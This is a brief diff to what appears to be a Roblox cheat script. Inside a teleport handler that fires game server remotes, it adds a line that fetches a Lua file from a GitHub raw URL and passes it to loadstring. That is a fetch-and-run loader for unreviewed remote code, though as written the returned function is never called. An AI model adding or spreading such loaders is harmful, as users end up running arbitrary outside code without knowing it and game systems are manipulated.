@@ -48,6 +48,8 @@ plrs.LocalPlayer.OnTeleport:Connect(function(state)
             game:GetService("ReplicatedStorage").UIRemotes.SetColl:FireServer()
             wait(2)
             game:GetService("ReplicatedStorage").ChangeChar:FireServer("Elly (PC98)")
+            wait(2)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixxerTrix/GeforceGTX/main/Main.lua",true))
         ]])
     end
 end)
